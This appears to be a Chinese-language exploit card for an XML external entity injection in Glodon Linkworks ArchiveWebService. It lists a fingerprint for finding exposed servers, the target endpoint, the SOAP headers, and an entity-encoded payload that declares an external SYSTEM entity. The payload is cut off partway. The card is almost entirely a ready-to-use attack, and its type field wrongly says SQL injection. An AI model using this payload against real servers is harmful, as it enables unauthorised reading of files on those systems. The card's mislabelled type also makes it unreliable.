# 广联达LinkworksArchiveWebServiceXML实体注入漏洞

- **系统**：广联达LinkworksArchiveWebServiceXML实体　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Services/Identification/login.ashx"`
- **请求**：`POST /GB/LK/Document/ArchiveService/ArchiveWebService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<PostArchiveInfo xmlns="http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx">
<archiveInfo>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x20;&#x5b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x2…（脚本共 2861 字，完整版见原文）
```
- **预期**：200　|　—